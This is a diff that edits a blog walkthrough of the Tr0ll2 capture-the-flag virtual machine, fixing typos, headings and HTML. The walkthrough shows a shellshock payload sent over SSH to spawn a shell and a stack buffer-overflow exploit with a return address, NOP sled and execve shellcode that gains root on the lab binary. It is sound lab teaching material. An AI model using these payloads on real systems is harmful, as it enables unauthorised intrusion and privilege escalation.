@@ -39,6 +39,10 @@ Difficulty is beginner++ to intermediate.
 
 ##Enumeration 
 
+Enumeration process started. 
+
+![Star Trek Enumeration](/img/kirk-enumeration.gif)
+
 <section class="shellbox">
     <div class="unit golden-large code">
       <p class="title">nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6</p>
@@ -128,7 +132,7 @@ Difficulty is beginner++ to intermediate.
 
 ####SSH Enumeration
 
-Zoning out watching my Nmap scan complete I noticed, the hostname was Tr0ll. I attempted to login via ssh with <code>Tr0ll</code> password: <code>Tr0ll</Tr0ll>, it worked ! But I instantly got booted off, tried a few things nothing worked... So I tried FTP.  
+Zoning out watching my Nmap scan complete I noticed, the hostname was Tr0ll. I attempted to login via ssh with <code>Tr0ll</code> password: <code>Tr0ll</code>, it worked ! But I instantly got booted off, tried a few things nothing worked... So I tried FTP.  
 
 ####FTP Enumeration
 
@@ -255,7 +259,7 @@ GENERATED WORDS: 21
 DOWNLOADED: 21 - FOUND: 4
 {% endhighlight %}
 
-They all rendered the same image (likely 301'd to another path).  
+They all rendered the same image (301'd).  
 
 ![tr0ll cats](/img/blog/tr0ll-cats.png)
 
@@ -269,7 +273,7 @@ What did you really think to find here? Try Harder
 
 ls -la showed a slightly different file size for one of the images, I began by running each of the files through cat (cating the cat? - sorry). 
 
-{% hightlight bash %}
+{% highlight bash %}
 8�z2��p�T�lj\p��?�<�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_��Look Deep within y0ur_self for the answer
 {% endhighlight %}
 
@@ -325,7 +329,7 @@ The top line looked promising, <code>ItCantReallyBeThisEasyRightLOL</code> I tri
 
 ![Data Yes Fist](\img\data-yes-fist.gif)
 
-Success. 
+Yes!
 
 The contents of <code>noob</code> 
 
@@ -365,11 +369,11 @@ Attempting to login using the discovered key failed, with a messaging saying <co
 
 ![Vulcan Rage Quit](\img\vulcan-ragequit.gif)
 
-I tried to feed it commands by tagging them on the end, the connection hung then dropped with no messages. 
+I tried to feed it commands by tagging them on the end, the connection hung then dropped with no message. 
 
 I googled some shellshock options and managed to spawn a shell with: 
 
-ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'
+<code>ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'</code>
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -387,7 +391,7 @@ ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'
 </section>
 
 
-###Local Enumeration
+##Local Enumeration
 
 Transfered my local enumeration script to the target, disclosing the following odd sticky bit files: 
 
@@ -432,6 +436,8 @@ Each of the door directories contained a file called r00t, du -sh * in the paren
 
 bof.c - pretty good indication that Buffer Overflow was the next logical step (unless it's more tr0ling). 
 
+##Exploit Development
+
 ###Fuzzing 
 
 I started by fuzzing with 300 A's: 
@@ -452,8 +458,6 @@ I started by fuzzing with 300 A's:
 
 Bangin' then I tried 250 no crash, adding 10 each time then subtracting when the seg fault occoured at 268 and the instruction pointer address at 269 <code>Illegal instruction</code>. 
 
-###Exploit Development
-
 Using gdb I located the address of ESP. 
 
 {% highlight bash %}
@@ -467,7 +471,7 @@ Padded with some NOPs - for a reliable landing.
 
 Overwrote EIP with the location of ESP tagged some shellcode on the end to exectute a shell. 
 
-####Final Exploit
+###Final Exploit
 
 {% highlight bash %}
 ./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
@@ -484,30 +488,46 @@ The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the
         <p class="line">
           <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
           <span class="command">du -sh *<br></span>
+        </p>
+        <p class="line">
           <span class="output">12K door1<br></span>
+        </p>
+        <p class="line">
           <span class="output">12K door2<br></span>
+        </p>
+        <p class="line">
           <span class="output">16K door3<br></span>
+        </p>
+        <p class="line">
+          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
           <span class="command">cd door3<br></span>
-          <span class="command">./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')<br></span>
-          <span class="output"><br></span>
-          <span class="command">id<br></span>
-          <span class="output">uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)<br></span>
+        </p>
+        <p class="line">
+          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+          <span class="command">./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" *<br> 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e<br>\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')<br></span>
+        </p>
+        <p class="line">
+          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
           <span class="command">whoami<br></span>
           <span class="output">root<br></span>
           <span class="output"><br></span>
+        </p>
+        <p class="line">
+          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
           <span class="command">cat /root/Proof.txt<br></span>
-          <span class="output">You win this time young Jedi... <span class="output">
+          <span class="output">You win this time young Jedi...</span>
           <span class="output"><br></span>
-          <span class="output">a70354f0258dcc00292c72aab3c8b1e4<br></span> 
+          <span class="output">a70354f0258dcc00292c72aab3c8b1e4<br></span>
         </p>
       </div>
     </div>
 </section>
 
 
-####Root dance...
+##Root dance 
 
 ![Root Dance](\img\girl-dancing-excited.gif)
 
 ##Thanks 
+
 Thanks to [@maleus21](https://twitter.com/@maleus21) for creating this VM challenege.
